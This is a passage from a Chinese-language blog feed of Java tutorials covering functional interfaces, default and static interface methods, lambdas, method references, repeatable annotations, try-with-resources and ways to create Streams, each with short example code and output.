class="language-none">@FunctionalInterfacepublic interface CalcInterface&lt;N, V&gt; &#123;V operation(N n1, N n2);   public boolean equals(Object object);public default void defaultMethod() &#123;&#125;public static void staticMethod() &#123;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个没用@FunctionalInterface函数式接口，有两个抽象方法，不能用于Lambda表达式。</p><pre class="line-numbers language-none"><code class="language-none">public interface CalcInterface&lt;N, V&gt; &#123;V operation(N n1, N n2);V operation2(N n1, N n2);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这个有两个抽象方法的用@FunctionalInterface注解的函数式接口编译会报错。</p><pre class="line-numbers language-none"><code class="language-none">@FunctionalInterfacepublic interface CalcInterface&lt;N, V&gt; &#123;V operation(N n1, N n2);V operation2(N n1, N n2);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个没有一个抽象方法，编译报错。</p><pre class="line-numbers language-none"><code class="language-none">public interface CalcInterface&lt;N, V&gt; &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java8 新特性之接口默认方法与静态方法</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Java8%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%E6%8E%A5%E5%8F%A3%E9%BB%98%E8%AE%A4%E6%96%B9%E6%B3%95%E4%B8%8E%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Java8%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%E6%8E%A5%E5%8F%A3%E9%BB%98%E8%AE%A4%E6%96%B9%E6%B3%95%E4%B8%8E%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="接口默认方法与静态方法"><a href="#接口默认方法与静态方法" class="headerlink" title="接口默认方法与静态方法"></a>接口默认方法与静态方法</h2><p>有这样一些场景，如果一个接口要添加一个方法，那所有的接口实现类都要去实现，而某些实现类根本就不需要实现这个方法也要写一个空实现，所以接口默认方法就是为了解决这个问题。</p><p>接口静态方法类似于默认方法，但是我们不能在实现类中覆盖它们，可以避免默认方法在实现类中被覆盖实现。</p><p>之前讲过的JDK8的list.foreache方法，看下源码，其实也是java.lang.Iterable接口的默认方法。</p><pre class="line-numbers language-none"><code class="language-none">default void forEach(Consumer&lt;? super T&gt; action) &#123;    Objects.requireNonNull(action);    for (T t : this) &#123;        action.accept(t);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h2><p>默认方法以<code>default</code>修饰，静态方法用<code>static</code>。</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;IUserInterface userInterface &#x3D; new UserServiceImpl();System.out.println(userInterface.getDefaultUser1());System.out.println(IUserInterface.getDefaultUser2());&#125;interface IUserInterface &#123;default User getDefaultUser1() &#123;return new User(&quot;Susan1&quot;, 11);&#125;static User getDefaultUser2() &#123;return new User(&quot;Susan2&quot;, 22);&#125;&#125;static class UserServiceImpl implements IUserInterface &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注意要点"><a href="#注意要点" class="headerlink" title="注意要点"></a>注意要点</h2><p>1、接口默认方法、静态方法可以有多个。</p><p>2、默认方法通过实例调用，静态方法通过接口名调用。</p><p>3、<code>default</code>默认方法关键字只能用在接口中。</p><p>4、默认方法可以被继承，如果继承了多个接口，多个接口都定义了多个同样的默认方法，实现类需要重写默认方法不然会报错。</p><p>5、静态方法不能被继承及覆盖，所以只被具体所在的接口调用。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java8 新特性之Lambda表达式</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Java8%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8BLambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Java8%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8BLambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是Lambda表达式"><a href="#什么是Lambda表达式" class="headerlink" title="什么是Lambda表达式"></a>什么是Lambda表达式</h2><p>Java 8的一个大亮点是引入Lambda表达式，使用它设计的代码会更加简洁。当开发者在编写Lambda表达式时，也会随之被编译成一个函数式接口。</p><h2 id="Lambda语法"><a href="#Lambda语法" class="headerlink" title="Lambda语法"></a>Lambda语法</h2><p>一行执行语句的写法：</p><pre class="line-numbers language-none"><code class="language-none">(parameters) -&gt; expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果有多行执行语句，可以加上<code>{}</code></p><pre class="line-numbers language-none"><code class="language-none">(parameters) -&gt; &#123; statements; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如：</p><pre class="line-numbers language-none"><code class="language-none">public int add(int x, int y) &#123;    return x + y;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>转换成Lambda表达式有以下几种写法：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 指定参数类型及return(int x, int y) -&gt; &#123; return x + y; &#125;&#x2F;&#x2F; 指定参数类型，不指定return(int x, int y) -&gt; x + y;&#x2F;&#x2F; 不指定参数类型和return，编译器会自动推断(x, y) -&gt; x + y; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Lambda用途"><a href="#Lambda用途" class="headerlink" title="Lambda用途"></a>Lambda用途</h2><h4 id="1、只有一个抽象方法的函数式接口"><a href="#1、只有一个抽象方法的函数式接口" class="headerlink" title="1、只有一个抽象方法的函数式接口"></a>1、只有一个抽象方法的函数式接口</h4><p>Lambda表达式的目标类型是函数式接口，什么是函数式接口之后会讲。</p><p>下面拿创建线程来举例，用lambda表达式可以有以下几种写法。</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;new Thread(new Runnable() &#123;@Overridepublic void run() &#123;System.out.println(&quot;t1&quot;);&#125;&#125;).start();Runnable runnable &#x3D; () -&gt; System.out.println(&quot;t2&quot;);new Thread(runnable).start();new Thread(() -&gt; System.out.println(&quot;t3&quot;)).start();new Thread(() -&gt; run(&quot;t4&quot;)).start();new Thread(() -&gt; &#123;String str &#x3D; &quot;t5&quot;;System.out.println(str);&#125;).start();&#125;private static void run(String str) &#123;System.out.println(str);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后输出：</p><pre class="line-numbers language-none"><code class="language-none">t1t2t3t4t5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2、集合批量操作"><a href="#2、集合批量操作" class="headerlink" title="2、集合批量操作"></a>2、集合批量操作</h4><p>下面打印list集合的两种写法是等价的。</p><pre class="line-numbers language-none"><code class="language-none">List&lt;String&gt; list &#x3D; Arrays.asList(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;);for(String str : list)&#123;System.out.println(str);&#125;list.forEach((e) -&gt; System.out.println(e));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3、流操作"><a href="#3、流操作" class="headerlink" title="3、流操作"></a>3、流操作</h4><p>下面是流查询list集合中等于<code>&quot;a&quot;</code>的数量。</p><pre class="line-numbers language-none"><code class="language-none">list.stream().filter((e) -&gt; &quot;a&quot;.equals(e)).count();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更多的Lambda表达式及关于流更多内容之后陆续会讲到。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java8 新特性之方法引用</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Java8%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Java8%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是方法引用"><a href="#什么是方法引用" class="headerlink" title="什么是方法引用"></a>什么是方法引用</h2><p>方法引用是只需要使用方法的名字，而具体调用交给函数式接口，需要和Lambda表达式配合使用。</p><p>如：</p><pre class="line-numbers language-none"><code class="language-none">List&lt;String&gt; list &#x3D; Arrays.asList(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;);list.forEach(str -&gt; System.out.print(str));list.forEach(System.out::print);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>上面两种写法是等价的。</p><h2 id="方法引用分类"><a href="#方法引用分类" class="headerlink" title="方法引用分类"></a>方法引用分类</h2><h3 id="1、构造器方法引用"><a href="#1、构造器方法引用" class="headerlink" title="1、构造器方法引用"></a>1、构造器方法引用</h3><p>格式：<code>Class::new</code>，调用默认构造器。</p><h3 id="2、类静态方法引用"><a href="#2、类静态方法引用" class="headerlink" title="2、类静态方法引用"></a>2、类静态方法引用</h3><p>格式：<code>Class::static_method</code></p><h3 id="3、类普通方法引用"><a href="#3、类普通方法引用" class="headerlink" title="3、类普通方法引用"></a>3、类普通方法引用</h3><p>格式：<code>Class::method</code>，方法不能带参数。</p><h3 id="4、实例方法引用"><a href="#4、实例方法引用" class="headerlink" title="4、实例方法引用"></a>4、实例方法引用</h3><p>格式：<code>instance::method</code></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>往User类添加方法引用方法：</p><pre class="line-numbers language-none"><code class="language-none">public static User create(Supplier&lt;User&gt; supplier)&#123;return supplier.get();&#125;public static void updateUsername(User user)&#123;user.setUsername(user.getUsername() + &quot; updated.&quot;);&#125;public void updateAge()&#123;this.setAge(this.getAge() + 10);&#125;public void changeAge(User user)&#123;user.setAge(user.getAge() + 10);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>方法引用测试：</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;List&lt;User&gt; list &#x3D; initList();&#x2F;&#x2F; 1、构造器方法引用User newUser &#x3D; User.create(User::new);newUser.setAge(1);newUser.setUsername(&quot;new&quot;);System.out.println(newUser);&#x2F;&#x2F; 2、类静态方法引用list.forEach(User::updateUsername);&#x2F;&#x2F; 3、类普通方法引用list.forEach(User::updateAge);&#x2F;&#x2F; 4、实例方法引用User user &#x3D; new User();list.forEach(user::changeAge);list.forEach(System.out::println);&#125;private static List&lt;User&gt; initList() &#123;List&lt;User&gt; list &#x3D; new ArrayList&lt;&gt;();list.add(new User(&quot;oaby&quot;, 23));list.add(new User(&quot;tom&quot;, 11));list.add(new User(&quot;john&quot;, 16));list.add(new User(&quot;jennis&quot;, 26));list.add(new User(&quot;tin&quot;, 26));list.add(new User(&quot;army&quot;, 26));list.add(new User(&quot;mack&quot;, 19));list.add(new User(&quot;jobs&quot;, 65));list.add(new User(&quot;jordan&quot;, 23));return list;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果：</p><pre class="line-numbers language-none"><code class="language-none">User [username&#x3D;new, age&#x3D;1]User [username&#x3D;oaby updated., age&#x3D;43]User [username&#x3D;tom updated., age&#x3D;31]User [username&#x3D;john updated., age&#x3D;36]User [username&#x3D;jennis updated., age&#x3D;46]User [username&#x3D;tin updated., age&#x3D;46]User [username&#x3D;army updated., age&#x3D;46]User [username&#x3D;mack updated., age&#x3D;39]User [username&#x3D;jobs updated., age&#x3D;85]User [username&#x3D;jordan updated., age&#x3D;43]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出方法引用都生效了，username和age都相应更新了。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java8 新特性之重复注解</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Java8%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%E9%87%8D%E5%A4%8D%E6%B3%A8%E8%A7%A3/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Java8%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%E9%87%8D%E5%A4%8D%E6%B3%A8%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是重复注解"><a href="#什么是重复注解" class="headerlink" title="什么是重复注解"></a>什么是重复注解</h2><p>下面是JDK8中的重复注解（<code>java.lang.annotation.Repeatable</code>）定义的源码。</p><pre class="line-numbers language-none"><code class="language-none">@Documented@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.ANNOTATION_TYPE)public @interface Repeatable &#123;    Class&lt;? extends Annotation&gt; value();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重复注解，即一个注解可以在一个类、方法或者字段上同时使用多次，如Spring中可以使用多个扫描组件来扫描多个包的注解。</p><pre class="line-numbers language-none"><code class="language-none">@ComponentScan@ComponentScanpublic class Configuration&#123;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ComponentScan</strong></p><pre class="line-numbers language-none"><code class="language-none">@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.TYPE)@Documented@Repeatable(ComponentScans.class)public @interface ComponentScan &#123;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ComponentScans</strong></p><pre class="line-numbers language-none"><code class="language-none">@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.TYPE)@Documented@Repeatable(ComponentScans.class)public @interface ComponentScan &#123;...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="重复注解实现"><a href="#重复注解实现" class="headerlink" title="重复注解实现"></a>重复注解实现</h2><p>下面来演示下重复注解的实现。</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;for (Token token : UserToken.class.getAnnotationsByType(Token.class)) &#123;System.out.println(token.value());&#125;&#125;@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)public @interface Tokens &#123;Token[] value();&#125;@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Repeatable(Tokens.class)public @interface Token &#123;String value();&#125;@Token(&quot;666666&quot;)@Token(&quot;888888&quot;)public interface UserToken &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果：</p><pre class="line-numbers language-none"><code class="language-none">666666888888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java9 简化流关闭新姿势</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java9/Java9%20%E7%AE%80%E5%8C%96%E6%B5%81%E5%85%B3%E9%97%AD%E6%96%B0%E5%A7%BF%E5%8A%BF/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java9/Java9%20%E7%AE%80%E5%8C%96%E6%B5%81%E5%85%B3%E9%97%AD%E6%96%B0%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-2-27/87594869.jpg"></p><p>做Java开发的都知道，每个资源的打开都需要对应的关闭操作，不然就会使资源一直占用而造成资源浪费，从而降低系统性能。</p><p>关于资源的关闭操作，从JDK7-JDK9有了不少的提升及简化。</p><h4 id="JDK6"><a href="#JDK6" class="headerlink" title="JDK6"></a>JDK6</h4><p>在JDK6及之前，每个资源都需要我们手动写代码关闭，如：</p><pre class="line-numbers language-none"><code class="language-none">FileInputStream fis &#x3D; null;byte[] buffer &#x3D; new byte[1024];try &#123;fis &#x3D; new FileInputStream(new File(&quot;E:\\Java技术.txt&quot;));while (fis.read(buffer) &gt; 0) &#123;System.out.println(new String(buffer));&#125;&#125; catch (Exception e) &#123;e.printStackTrace();&#125; finally &#123;if (fis !&#x3D; null) &#123;try &#123;fis.close();&#125; catch (IOException e) &#123;e.printStackTrace();&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>资源打开使用完后，必须在finally块中进行手动关闭！我们有的同事，做一个查询功能点，打开了连接查询完后没有手动关闭，最后造成连接池超出最大连接数而使系统功能堵塞。</p><h4 id="JDK7"><a href="#JDK7" class="headerlink" title="JDK7"></a>JDK7</h4><p>JDK7发布后，添加了新特性：try-with-resources语句。所有需要关闭的资源只要实现了<code>java.lang.AutoCloseable</code>（java.io.Closeable就实现了这个接口）接口就在会程序结束后自动关闭。</p><p>如上面的读取文件的流程序用JDK7来写：</p><pre class="line-numbers language-none"><code class="language-none">byte[] buffer &#x3D; new byte[1024];try (FileInputStream fis &#x3D; new FileInputStream(new File(&quot;E:\\Java技术.txt&quot;))) &#123;while (fis.read(buffer) &gt; 0) &#123;System.out.println(new String(buffer));&#125;&#125; catch (Exception e) &#123;e.printStackTrace();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所有的资源在<code>try()</code>里面定义，并去掉了finally模块。</p><p>下面我们来写一个自定义的流来看看是否自动关闭了。</p><p><strong>定义一个自定义输入输出流</strong></p><pre class="line-numbers language-none"><code class="language-none">class MyInputStream implements AutoCloseable &#123;void read(String content) &#123;System.out.println(&quot;read content &quot; + content);&#125;@Overridepublic void close() throws Exception &#123;System.out.println(&quot;input stream is closed.&quot;);&#125;&#125;class MyOutputStream implements AutoCloseable &#123;void write(String content) &#123;System.out.println(&quot;write content &quot; + content);&#125;@Overridepublic void close() throws Exception &#123;System.out.println(&quot;out stream is closed.&quot;);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>单个资源自动关闭</strong></p><pre class="line-numbers language-none"><code class="language-none">try (MyInputStream mis &#x3D; new MyInputStream()) &#123;mis.read(&quot;7_2&quot;);&#125; catch (Exception e) &#123;e.printStackTrace();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><blockquote><p>read content 7_2<br>input stream is closed.</p></blockquote><p><strong>多个资源自动关闭</strong></p><p><code>try()</code>里面可以定义多个资源，它们的关闭顺序是最后在<code>try()</code>定义的资源先关闭。</p><pre class="line-numbers language-none"><code class="language-none">try (MyInputStream mis &#x3D; new MyInputStream(); MyOutputStream mos &#x3D; new MyOutputStream()) &#123;mis.read(&quot;7_3&quot;);mos.write(&quot;7_3&quot;);&#125; catch (Exception e) &#123;e.printStackTrace();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><blockquote><p>read content 7_3<br>write content 7_3<br>out stream is closed.<br>input stream is closed.</p></blockquote><h4 id="JDK9"><a href="#JDK9" class="headerlink" title="JDK9"></a>JDK9</h4><p>JDK9发布后，又简化了try-with-resources语句的用法。</p><p><code>try()</code>里面可以是一个变量，但必须是final的或者等同final才行。如下面的mis，mos定义成局部变量可以不用final，局部变量可以等同于final，但定义成成员变量就必须是用final修饰的，不然会编译错误。</p><pre class="line-numbers language-none"><code class="language-none">MyInputStream mis &#x3D; new MyInputStream();MyOutputStream mos &#x3D; new MyOutputStream();try (mis; mos) &#123;mis.read(&quot;1.9&quot;);mos.write(&quot;1.9&quot;);&#125; catch (Exception e) &#123;e.printStackTrace();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><blockquote><p>read content 1.9<br>write content 1.9<br>out stream is closed.<br>input stream is closed.</p></blockquote><p>再来看个例子：</p><pre class="line-numbers language-none"><code class="language-none">Connection dbCon &#x3D; DriverManager.getConnection(&quot;url&quot;, &quot;user&quot;, &quot;password&quot;);try (dbCon; ResultSet rs &#x3D; dbCon.createStatement().executeQuery(&quot;select * from emp&quot;)) &#123;    while (rs.next()) &#123;        System.out.println(&quot;In loadDataFromDB() &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; &quot; + rs.getString(1));    &#125;&#125; catch (SQLException e) &#123;    System.out.println(&quot;Exception occurs while reading the data from DB -&gt;&quot; + e.getMessage());&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dbCon和rs都能被自动关闭。</p><p>JKD9虽然简化了，但感觉还是没有什么质的变化，实际用途我们可能不希望关心资源的关闭，或者在方法结束之后如果是局部变量它就能自动关闭。或许是我站的高度不够，官方有其他的考量，但JDK9的这一点变化还是非常有用的。</p><p>更多JDK9的新功能实战陆续更新，如果觉得有用，分享到朋友圈给更多的人吧！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 8 创建 Stream 的 10 种方式，我保证你受益无穷!</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E5%88%9B%E5%BB%BA%20Stream%20%E7%9A%84%2010%20%E7%A7%8D%E6%96%B9%E5%BC%8F%EF%BC%8C%E6%88%91%E4%BF%9D%E8%AF%81%E4%BD%A0%E5%8F%97%E7%9B%8A%E6%97%A0%E7%A9%B7!/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E5%88%9B%E5%BB%BA%20Stream%20%E7%9A%84%2010%20%E7%A7%8D%E6%96%B9%E5%BC%8F%EF%BC%8C%E6%88%91%E4%BF%9D%E8%AF%81%E4%BD%A0%E5%8F%97%E7%9B%8A%E6%97%A0%E7%A9%B7!/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/20190613135450.png"><br><img src="http://img.javastack.cn/20190613135537.png"></p><p>今天来分享下在 Java 8 中创建 Stream 的 10 种方式，我就整理了 10 种，其实还有更多，仅供大家参考学习下。</p><h2 id="1、Stream-of-可变参数"><a href="#1、Stream-of-可变参数" class="headerlink" title="1、Stream.of 可变参数"></a>1、Stream.of 可变参数</h2><pre class="line-numbers language-none"><code class="language-none">Stream&lt;String&gt; stream1 &#x3D; Stream.of(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;);System.out.println(&quot;stream1:&quot; + stream1.collect(joining()));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>程序输出：</p><blockquote><p>stream1:ABC</p></blockquote><h2 id="2、Stream-of-数组"><a href="#2、Stream-of-数组" class="headerlink" title="2、Stream.of 数组"></a>2、Stream.of 数组</h2><pre class="line-numbers language-none"><code class="language-none">String[] values &#x3D; new String[]&#123;&quot;A&quot;, &quot;B&quot;, &quot;C&quot;&#125;;Stream&lt;String&gt; stream2 &#x3D; Stream.of(values);System.out.println(&quot;stream2:&quot; + stream2.collect(joining()));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>程序输出：</p><blockquote><p>stream2:ABC</p></blockquote><p>看 Stream.of 源码，上面这两种方式其实就是第三种方式的包装版。</p><pre class="line-numbers language-none"><code class="language-none">public static&lt;T&gt; Stream&lt;T&gt; of(T... values) &#123;    return Arrays.stream(values);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们直接使用源码中的方式也是一样的。</p><h2 id="3、Arrays-stream"><a href="#3、Arrays-stream" class="headerlink" title="3、Arrays.stream"></a>3、Arrays.stream</h2><pre class="line-numbers language-none"><code class="language-none">String[] values &#x3D; new String[]&#123;&quot;A&quot;, &quot;B&quot;, &quot;C&quot;&#125;;Stream&lt;String&gt; stream3 &#x3D; Arrays.stream(values);System.out.println(&quot;stream3:&quot; + stream3.collect(joining()));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>程序输出：</p><blockquote><p>stream3:ABC</p></blockquote><h2 id="4、List"><a href="#4、List" class="headerlink" title="4、List"></a>4、List</h2><pre class="line-numbers language-none"><code class="language-none">List&lt;String&gt; list &#x3D; Arrays.asList(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;);Stream&lt;String&gt; stream4 &#x3D; list.stream();System.out.println(&quot;stream4:&quot; + stream4.collect(joining()));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>程序输出：</p><blockquote><p>stream4:ABC</p></blockquote><h2 id="5、Set"><a href="#5、Set" class="headerlink" title="5、Set"></a>5、Set</h2><pre class="line-numbers language-none"><code class="language-none">Set&lt;String&gt; set &#x3D; new HashSet&lt;&gt;(Arrays.asList(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;));Stream&lt;String&gt; stream5 &#x3D; set.stream();System.out.println(&quot;stream5:&quot; + stream5.collect(joining()));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>程序输出：</p><blockquote><p>stream5:ABC</p></blockquote><h2 id="6、Map"><a href="#6、Map" class="headerlink" title="6、Map"></a>6、Map</h2><pre class="line-numbers language-none"><code class="language-none">Map&lt;String, String&gt; map &#x3D; new HashMap&lt;&gt;();map.put(&quot;1&quot;, &quot;A&quot;);map.put(&quot;2&quot;, &quot;B&quot;);map.put(&quot;3&quot;, &quot;C&quot;);Stream&lt;String&gt; stream6 &#x3D; map.values().stream();System.out.println(&quot;stream6:&quot; + stream6.collect(joining()));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序输出：</p><blockquote><p>stream6:ABC</p></blockquote><h2 id="7、Stream-iterate"><a href="#7、Stream-iterate" class="headerlink" title="7、Stream.iterate"></a>7、Stream.iterate</h2><pre class="line-numbers language-none"><code class="language-none">Stream&lt;String&gt; stream7 &#x3D; Stream.iterate(&quot;A&quot;, e -&gt; String.valueOf((char) (e.charAt(0) + 1))).limit(3);System.out.println(&quot;stream7:&quot; + stream7.collect(joining()));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>程序输出：</p><blockquote><p>stream7:ABC</p></blockquote><h2 id="8、Pattern"><a href="#8、Pattern" class="headerlink" title="8、Pattern"></a>8、Pattern</h2><pre class="line-numbers language-none"><code class="language-none">String value &#x3D; &quot;A B C&quot;;Stream&lt;String&gt; stream8 &#x3D; Pattern.compile(&quot;\\W&quot;).splitAsStream(value);System.out.println(&quot;stream8:&quot; + stream8.collect(joining()));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>程序输出：</p><blockquote><p>stream8:ABC</p></blockquote><h2 id="9、Files-lines"><a href="#9、Files-lines" class="headerlink" title="9、Files.lines"></a>9、Files.lines</h2><pre class="line-numbers language-none"><code class="language-none">try &#123;    Stream&lt;String&gt; stream9 &#x3D; Files.lines(Paths.get(&quot;d:&#x2F;data.txt&quot;));    